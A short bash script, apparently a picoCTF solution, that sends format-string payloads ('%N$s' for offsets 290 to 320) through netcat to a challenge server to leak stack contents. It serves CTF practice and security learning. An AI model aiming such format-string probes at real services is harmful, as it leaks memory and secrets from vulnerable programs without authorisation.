#!/usr/bin/bash

for i in $(seq 290 320); do 
    echo $i
    (python2 -c "print '1'"; python2 -c "print '%${i}\$s'") | nc mercury.picoctf.net 53437 | tail -n +9 | head -5
done
